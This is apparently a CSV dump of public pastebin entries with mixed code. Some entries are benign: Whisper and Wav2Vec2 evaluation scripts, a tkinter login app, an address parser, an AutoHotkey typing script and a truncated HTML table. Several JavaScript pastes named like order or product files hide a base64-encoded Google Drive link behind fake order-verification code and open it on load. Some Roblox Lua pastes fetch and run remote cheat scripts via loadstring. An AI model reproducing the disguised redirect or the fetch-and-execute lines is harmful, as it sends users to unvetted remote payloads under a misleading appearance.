id,title,username,language,date,content
agQ8D0XY,Products.js,REAPER_03,JavaScript,Thursday 29th of May 2025 01:04:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48840/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FqZBH8fU,Grow A Garden Dupe v2,velvetkk,Lua,Thursday 29th of May 2025 01:04:08 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/castleofsolace/GrowAGardenDUPE1/refs/heads/main/mainHub""))()


-- CHANGELOGS [05/29/2025]
-- Fixed pets not being duped
-- Added dupe delay
-- Removed gear duping (caused bans)"
ufY16MTm,Order.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:59:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49481/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YKJiSzKv,Market.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:53:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13483/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZRzjNqDf,Untitled,REAPER_03,JavaScript,Thursday 29th of May 2025 12:48:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71170/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4igf7KVj,Results_evaluation.py,cataleena,Python,Thursday 29th of May 2025 12:19:08 PM CDT,"import csv
from collections import Counter

# --- CONFIGURATION ---
INPUT_CSV = ""ok_whisper_eval_results_tiny.csv""  # Update as needed

# --- Initialize accumulators ---
latencies = []
wers = []
num_valid_entries = 0

# --- Read the CSV and process rows ---
with open(INPUT_CSV, newline="""", encoding=""utf-8"") as csvfile:
    reader = csv.DictReader(csvfile)
    
    for row in reader:
        try:
            latency = float(row[""latency_per_sec""])
            wer = float(row[""WER""])
            latencies.append(latency)
            wers.append(wer)
            num_valid_entries += 1
        except ValueError:
            print(f""Skipping invalid row: {row['file_name']}"")

# --- Function to calculate distribution bins ---
def get_distribution(values, bins=5, label=""Value""):
    if not values:
        return {}
    min_val, max_val = min(values), max(values)
    step = (max_val - min_val) / bins
    bin_edges = [min_val + i * step for i in range(bins + 1)]
    bin_counts = Counter()

    for v in values:
        for i in range(bins):
            if bin_edges[i] <= v < bin_edges[i + 1]:
                bin_counts[f""{bin_edges[i]:.2f} - {bin_edges[i + 1]:.2f}""] += 1
                break
        else:
            if v == bin_edges[-1]:
                bin_counts[f""{bin_edges[-2]:.2f} - {bin_edges[-1]:.2f}""] += 1

    print(f""\n {label} Distribution (bins={bins}):"")
    for bin_label in sorted(bin_counts.keys()):
        print(f""  {bin_label}: {bin_counts[bin_label]}"")

# --- Compute and print results ---
if num_valid_entries > 0:
    avg_latency = round(sum(latencies) / num_valid_entries, 3)
    min_latency = round(min(latencies), 3)
    max_latency = round(max(latencies), 3)

    avg_wer = round(sum(wers) / num_valid_entries, 3)
    min_wer = round(min(wers), 3)
    max_wer = round(max(wers), 3)

    print(f"" Processed {num_valid_entries} entries from {INPUT_CSV}"")
    print(f""\n Latency/sec   Avg: {avg_latency}, Min: {min_latency}, Max: {max_latency}"")
    print(f"" WER             Avg: {avg_wer}, Min: {min_wer}, Max: {max_wer}"")

    get_distribution(latencies, bins=5, label=""Latency/sec"")
    get_distribution(wers, bins=5, label=""WER"")
else:
    print("" No valid entries found."")"
AwyCwkcb,Products.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:16:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76473/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zw7qBYUW,Order.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:10:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30905/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vumeUCQh,Python login/signup page with encryption and hashes,abdullahafzel1010,Python,Thursday 29th of May 2025 12:09:04 PM CDT,"from tkinter import *
import tkinter
import tkinter.filedialog
from functools import partial
import os
from binascii import *
from hashlib import *
from cryptography.fernet import Fernet, InvalidToken
from pathlib import *

root = Tk()
root.title(""Login"")
canvas = Canvas(root, width=500, height=500)
global usernameid
labelFont = (""Verdana"", 13)

# loading in the folders and files for first time use or files/folders not found
if not Path(""Accounts"").is_dir():
    os.mkdir(""Accounts"")
if not Path(""Keys"").is_dir():
    os.mkdir(""Keys"")
if not Path(""accs"").is_dir():
    os.mkdir(""accs"")
if not Path(""accs/passwords.txt"").is_file():
    file = open(""accs/passwords.txt"", ""w+"")
    file.close()
if not Path(""accs/usernames.txt"").is_file():
    file1 = open(""accs/usernames.txt"", ""w+"")
    file1.close()

def LoggedIn():
    root.quit()
    CurrentStat = StringVar()
    CurrentStat.set(""..."")
    OutputStat = StringVar(value="""")
    FileToOpen = """"

    def createFile():
        content = f""""""
Id: {IdEntry.get()}
Username: {UsernameEntry.get()}
Password: {PasswordEntry.get()}
            """"""
        print(content)
        print(content)
        file = open(""Accounts/%s.txt"" % IdEntry.get(), ""wb"")
        encrypted = fernet.encrypt(content.encode())
        file.write(encrypted)
        file.close()

    def openFile():
        fileToOpen = tkinter.filedialog.askopenfilename(initialdir=""Accounts"", title=""Select A File"",
                                                filetypes=((""txt files"", ""*.txt""), (""all files"", '*.*')))
        StatusBar.config(text=""Status: Working"")
        try:

            file = open(fileToOpen, ""r"")
            text = file.read().encode()
            text_decrypted = fernet.decrypt(text).decode()
            print(text_decrypted)
            output.insert(INSERT, text_decrypted)
        except FileNotFoundError:
            pass
        except InvalidToken:
            StatusBar.config(text=""Invalid File Or Another Users File"")

    username = str(usernameVar.get())
    root3 = Tk()
    canvas3 = Canvas(root3, width=750, height=400)
    root3.title(""Welcome, %s"" % username.capitalize())
    # Generating a Fernet key, when a new user joins. Every User has its own unique key.
    usernamehash = hexlify(pbkdf2_hmac(""sha256"", username.encode(), b""salt"", 100000))
    try:
        # Checking if a key exists
        file = open(""Keys/%s.key"" % usernamehash, ""rb"")
        key = file.read()
        file.close()
    except FileNotFoundError:
        # if not then generate one and create a file with the key specified to the user.
        key = Fernet.generate_key()
        file = open(""Keys/%s.key"" % usernamehash, ""wb"")
        file.write(key)
        file.close()
    finally:
        # finally opening the file with the key. To be sure that the new user has a key.
        file = open(""Keys/%s.key"" % usernamehash, ""rb"")
        key = file.read()
        file.close()
        fernet = Fernet(key)

    welcomeLabel = Label(root3, text=""Welcome, %s"" % username.capitalize(), font=(""Verdana"", 17))
    canvas3.create_window(750 / 2, 10, window=welcomeLabel)

    StatusBar = Label(root3, text=""Status: Working"", font=(""Verdana"", 13), borderwidth=3, relief=""sunken"")
    canvas3.create_window(375, 50, window=StatusBar)

    openButton = Button(root3, text=""Open File"", font=(""Verddana"", 10), width=7, height=2, command=openFile)
    canvas3.create_window(120, 150, window=openButton)

    openDescription = Label(root3, text=""Open Files That You Have Created(Decrypted Version)"", font=(""Verdana"", 13))
    canvas3.create_window(262, 100, window=openDescription)

    createButton = Button(root3, text=""Create"", font=(""Verdana"", 15), command=createFile)
    canvas3.create_window(375, 370, window=createButton)

    createDescription = Label(root3, text=""Create new file(s)/Id(s) such as your Gmail Id/Account(s)"",
                              font=(""Verdana"", 12))
    canvas3.create_window(260, 205, window=createDescription)

    exitButton = Button(root3, text=""Exit"", font=(""Verdana"", 15), command=exit)
    canvas3.create_window(700, 350, window=exitButton)

    output = Text(root3, width=25, borderwidth=3, height=4, relief=""sunken"")  # Output
    canvas3.create_window(300, 150, window=output)

    UsernameLabel = Label(root3, text=""Username/Email"", font=(""Verdana"", 13))
    canvas3.create_window(100, 250, window=UsernameLabel)

    UsernameVar = StringVar(value="""")
    UsernameEntry = Entry(root3, textvariable=UsernameVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 250, window=UsernameEntry)

    PasswordLabel = Label(root3, text=""Password"", font=(""Verdana"", 13))
    canvas3.create_window(70, 290, window=PasswordLabel)

    passwordVar = StringVar(value="""")
    PasswordEntry = Entry(root3, textvariable=passwordVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 290, window=PasswordEntry)

    IdLabel = Label(root3, text=""Id Of The File"", font=(""Verdana"", 13))
    canvas3.create_window(87, 330, window=IdLabel)

    IdVar = StringVar(value="""")
    IdEntry = Entry(root3, textvariable=IdVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 330, window=IdEntry)

    canvas3.pack()
    root3.mainloop()


def Signup():
    root2 = Tk()
    canvas2 = Canvas(root2, width=750, height=400)

    userLabel = Label(root2, text=""UserName"", font=labelFont)
    canvas2.create_window(75, 50, window=userLabel)

    uservar = StringVar(value="""")
    username = Entry(root2, textvariable=uservar, font=labelFont, width=40)
    canvas2.create_window(400, 50, window=username)

    passLabel = Label(root2, text=""Password"", font=labelFont)
    canvas2.create_window(73, 85, window=passLabel)

    passvar = StringVar()
    password = Entry(root2, textvariable=passvar, font=labelFont, width=40)
    canvas2.create_window(400, 85, window=password)

    def write():

        userKey = open(""accs/usernames.txt"", ""r"")
        userw = userKey.read().split(""\n"")
        usernamedecrypted = hexlify(pbkdf2_hmac('sha256', username.get().encode(), b'salt', 100000)).decode()
        check = False
        try:
            for user in userw:

                if usernamedecrypted == user:
                    check = True
        finally:
            if check == False:

                print(""user created"")
                file = open(""accs/usernames.txt"", ""a"")
                file.write(f""\n{hexlify(pbkdf2_hmac('sha256', username.get().encode(), b'salt', 100000)).decode()}"")
                print(username.get())
                usernameid = username.get()
                file.close()

                file = open(""accs/passwords.txt"", ""a"")
                file.write(f'\n' + hexlify(pbkdf2_hmac('sha256', password.get().encode(), b'salt', 100000)).decode())
                print(password.get())
                file.close()
                print(""passwords hashed"")
            else:
                print(""user already exists"")
                messageBox = messagebox.showinfo(title=""User Exists"", message=""User Already Exists!"")

    button = Button(root2, text=""Sign Up"", font=labelFont,
                    command=write)
    canvas2.create_window(200, 150, window=button)

    canvas2.pack()
    root2.mainloop()


def Login(usernamevar, passwordvar, status, user):
    try:
        userKey = open(""accs/usernames.txt"", ""r"")
        userw = userKey.read().split(""\n"")

        userKey.close()

        file = open(""accs/passwords.txt"", ""r"")
        passw = file.read().split(""\n"")
        file.close()

        userk = pbkdf2_hmac('sha256', usernamevar.get().encode(), b'salt', 100000)
        passk = pbkdf2_hmac('sha256', passwordvar.get().encode(), b'salt', 100000)
        usernamevar = hexlify(userk).decode()
        passwordvar = hexlify(passk).decode()
    except FileNotFoundError:
        status.config(text=""Invalid Password or username"")

    check = False
    # identifying hashes
    try:
        for password in passw:
            for username in userw:
                if not check:
                    if usernamevar == username and passwordvar == password:
                        print(""valid"")
                        status.config(text=""Logged In"")
                        check = True
                        LoggedIn()
    finally:
        if not check:
            print('invalid')
            status.config(text=""Invalid Username Or password"")


stat = ""...""

usernameLabel = Label(root, text=""Username"", font=('Verdana', 13))
canvas.create_window(200, 70, window=usernameLabel)

usernameVar = StringVar()
usernameVar.set("""")
Username = Entry(root, textvariable=usernameVar, font=(""Verdana"", 15))
canvas.create_window(200, 100, window=Username)

passwordLabel = Label(root, text=""Password"", font=('Verdana', 12))
canvas.create_window(200, 125, window=passwordLabel)

PasswordVar = StringVar(value="""")
Password = Entry(root, textvariable=PasswordVar, font=(""Verdana"", 15))
canvas.create_window(200, 150, window=Password)

signup = Button(root, text=""Signup"", font=(""Verdana"", 12), command=Signup)
canvas.create_window(270, 190, window=signup)

status = Label(root, text=""Waiting..."", font=(""Verdaana"", 13))
canvas.create_window(200, 20, window=status)

us = usernameVar

Confirm = Button(root,
                 text=""Login"",
                 command=partial(Login, usernameVar, PasswordVar, status, us),
                 font=('Verdana', 12))

canvas.create_window(200, 190, window=Confirm)

canvas.pack()
root.mainloop()"
W3kAjhru,Wav2Vec-catalina,cataleena,Python,Thursday 29th of May 2025 12:07:30 PM CDT,"import os
import glob
import csv
import time
import resource
import soundfile as sf
from jiwer import wer
import torch
from transformers import Wav2Vec2ForCTC, Wav2Vec2Processor

# --- CONFIGURATION ---
AUDIO_ROOT = ""/home/catalina/datasets/LibriSpeech/dev-clean""
OUTPUT_CSV = ""wav2vec2_eval_results.csv""
MODEL_NAME = ""facebook/wav2vec2-base-960h""

print(""Loading ground truth transcriptions..."")
ground_truths = {}
trans_files = glob.glob(os.path.join(AUDIO_ROOT, ""*"", ""*"", ""*.trans.txt""))

for trans_file in trans_files:
    with open(trans_file, ""r"", encoding=""utf-8"") as f:
        for line in f:
            parts = line.strip().split(maxsplit=1)
            if len(parts) == 2:
                file_id, transcript = parts
                ground_truths[file_id + "".flac""] = transcript.strip()
print(f""Loaded {len(ground_truths)} transcriptions."")

print(""Collecting .flac audio files..."")
audio_files = glob.glob(os.path.join(AUDIO_ROOT, ""*"", ""*"", ""*.flac""))
print(f""Found {len(audio_files)} audio files.\n"")

print(f""Loading Wav2Vec2 model and processor ({MODEL_NAME})..."")
processor = Wav2Vec2Processor.from_pretrained(MODEL_NAME)
model = Wav2Vec2ForCTC.from_pretrained(MODEL_NAME)
model.eval()
if torch.cuda.is_available():
    model.to(""cuda"")
print(""Model loaded.\n"")

def transcribe(audio_path):
    # Read audio
    speech, sample_rate = sf.read(audio_path)
    if sample_rate != 16000:
        raise ValueError(f""Expected 16kHz sample rate, got {sample_rate}"")

    input_values = processor(speech, sampling_rate=sample_rate, return_tensors=""pt"").input_values
    if torch.cuda.is_available():
        input_values = input_values.to(""cuda"")

    with torch.no_grad():
        logits = model(input_values).logits
    predicted_ids = torch.argmax(logits, dim=-1)
    transcription = processor.batch_decode(predicted_ids)[0]
    return transcription.lower()

with open(OUTPUT_CSV, mode=""w"", newline="""", encoding=""utf-8"") as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow([
        ""model"",
        ""file_name"",
        ""speaker_id"",
        ""chapter_id"",
        ""audio_duration_sec"",
        ""transcription_time_sec"",
        ""latency_per_sec"",
        ""WER"",
        ""RAM_peak_MB"",
        ""transcription""
    ])

    for idx, file_path in enumerate(audio_files, start=1):
        file_name = os.path.basename(file_path)
        speaker_id = os.path.basename(os.path.dirname(os.path.dirname(file_path)))
        chapter_id = os.path.basename(os.path.dirname(file_path))

        print(f""[Wav2Vec2] Transcribing: {file_name} ({idx} of {len(audio_files)})"")

        try:
            speech, sample_rate = sf.read(file_path)
        except Exception as e:
            print(f""Skipping {file_name}, error reading audio: {e}"")
            continue

        duration = len(speech) / sample_rate

        usage_before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        start_time = time.time()

        try:
            transcript = transcribe(file_path)
        except Exception as e:
            print(f""Error transcribing {file_name}: {e}"")
            continue

        end_time = time.time()
        transcription_time = end_time - start_time
        latency = transcription_time / duration if duration > 0 else 0

        usage_after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        ram_peak_mb = round((usage_after - usage_before) / 1024, 2)

        ground_truth = ground_truths.get(file_name, """")
        if ground_truth:
            wer_value = round(wer(ground_truth.lower(), transcript.lower()), 3)
        else:
            wer_value = ""N/A""
            print(f""Warning: No ground truth found for {file_name}"")

        writer.writerow([
            ""wav2vec2"",
            file_name,
            speaker_id,
            chapter_id,
            round(duration, 2),
            round(transcription_time, 2),
            round(latency, 3),
            wer_value,
            ram_peak_mb,
            transcript
        ])
print(""Done."")
"
LaCLXBdT,Grow A Garden Script Hub v1,velvetkk,Lua,Thursday 29th of May 2025 11:49:36 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/castleofsolace/GrowAGardenHub/refs/heads/main/MAIN1""))()

-- CHANGE LOGS [05/29/2025]
-- Fixed server searching
-- Fixed webhooks
-- Fixed Auto TP
-- Fixed autobuy
-- Fixed lag"
DustJndJ,extraerCalleYNumero,code2508,JavaScript,Thursday 29th of May 2025 11:35:37 AM CDT,"/**
 * Extrae el nombre de la calle y el número exterior de una dirección.
 * 
 * @param {string} direccion - La dirección completa en formato ""Nombre de la calle NúmeroExterior""
 * @returns {{ calle: string, next: string }} Un objeto con la calle y el número exterior separado
 */
export const extraerCalleYNumero = (direccion) => {
  // Elimina espacios al inicio y final, y divide la dirección por espacios en un array
  const partes = direccion.trim().split("" "");

  // Se asume que la última palabra es el número exterior
  let next = partes.pop();

  // Verifica si la última palabra NO es un número, pero la penúltima SÍ lo es
  // Ejemplo: ""Av. Insurgentes 123-A""
  if (isNaN(next) && partes.length > 0 && !isNaN(partes[partes.length - 1])) {
      // Combina ambas partes como número exterior: ""123 A""
      next = `${partes.pop()} ${next}`;
  }

  // Lo que queda se considera como el nombre de la calle
  const calle = partes.join("" "");

  // Devuelve un objeto con la calle y el número exterior separados
  return { calle: calle, next: next };
};


// Ejemplos de uso:

extraerCalleYNumero(""Av. Reforma 245"") 
// -> { calle: ""Av. Reforma"", next: ""245"" }

extraerCalleYNumero(""Calle 5 de Mayo 123-B"")
// -> { calle: ""Calle 5 de Mayo"", next: ""123-B"" }
"
PYYsitc3,Grow a garden Dupe Script Pastebin,ok76777,Lua,Thursday 29th of May 2025 10:36:11 AM CDT,loadstring(game:HttpGet('https://pastefy.app/a7ST299r/raw'))()
GPThcZpR,Untitled,blashstar,Autohotkey,Thursday 29th of May 2025 10:24:18 AM CDT,"#Requires AutoHotkey v2.0
#SingleInstance Force

; Script AutoHotkey para escribir texto del portapapeles letra por letra
; Atajo: Ctrl + Shift + V
^+v:: {
    texto := Trim(A_Clipboard)

    ; Configuración de tiempos de espera
    esperaMin := 10   ; Tiempo mínimo de espera entre letras en ms
    esperaMax := 50  ; Tiempo máximo de espera entre letras en ms
    esperaLineaMin := 20  ; Tiempo mínimo de espera entre líneas en ms
    esperaLineaMax := 100  ; Tiempo máximo de espera entre líneas en ms

    ; Verificar si el portapapeles está vacío
    if (texto = """") {
        TrayTip(""El portapapeles está vacío"", ""PegarEscribiendo"", 1)
        return
    }

    ; Dividir el texto en líneas
    lineas := StrSplit(texto, ""`n"", ""`r"")

    ; Iterar sobre cada línea
    for _, linea in lineas {
        ; Espera aleatoria antes de enviar cada línea
        espera := Random(esperaMin, esperaMax)
        SetKeyDelay(espera)

        ; Enviar el texto de la línea actual
        SendText(linea)

        ; Enviar un salto de línea si no es la última línea
        if (A_Index < lineas.Length) {
            Sleep(esperaLineaMin)
            SetKeyDelay(esperaMax)
            SendText("" "")
            SendEvent(""{Backspace}+{Enter}"") ; Enviar Enter para nueva línea

        }

        ; Espera aleatoria después de cada línea
        espera := Random(esperaLineaMin, esperaLineaMax)
        Sleep(espera)
    }

    return
}

; Mostrar notificación inicial
TrayTip(""Script cargado`nPresiona Ctrl + Shift + V para usarlo"", ""PegarEscribiendo"", 1)
"
64hEhkHr,26931661,iamjohnrex03,HTML,Thursday 29th of May 2025 10:14:48 AM CDT,"<table style=""height: 129px; width: 611px; border-color: #5e1224; margin-left: auto; margin-right: auto;"" border=""3"" cellpadding=""2"">
  <tbody>
    <tr>
      <td style=""width: 30%; text-align: center;""><span style=""font-size: 12pt;""></span></td>
      <td style=""width: 14%; text-align: center;""><span style=""font-size: 12pt;"">{teamMember}</span></td>
      <td style=""width: 14%; text-align: center;""><span style=""font-size: 12pt;"">{teamMember10}</span></td>
      <td style=""width: 14%; text-align: center;""><span style=""font-size: 12pt;"">{teamMember11}</span></td>
      <td style=""width: 14%; text-align: center;""><span style=""font-size: 12pt;"">{teamMember12}</span></td>
      <td style=""width: 14%; text-align: center;""><span style=""font-size: 12pt;"">{teamMember329}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">Includes people</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{includesPeople}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{includesPeople50}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{includesPeople67}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{includesPeople85}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Includes347}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">Wants to include people</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo51}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo68}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo86}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants348}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">People include them.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleInclude16}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleInclude52}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleInclude69}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleInclude87}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleInclude349}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">They want to be included.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{thisPerson}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{hesheWants53}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople70}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople88}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants350}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">Controls people.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{controlsPeople}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{controlsPeople54}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{controlsPeople71}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{controlsPeople89}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Controls351}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">Wants to control people.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo19}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo55}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo72}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo90}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants352}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">People control them.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleControl20}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleControl56}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleControl73}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleControl91}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleControl353}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">They want to be controlled.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{hesheWants}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople74}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople92}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants354}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">They are open with people.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammemberIs}</span></td>
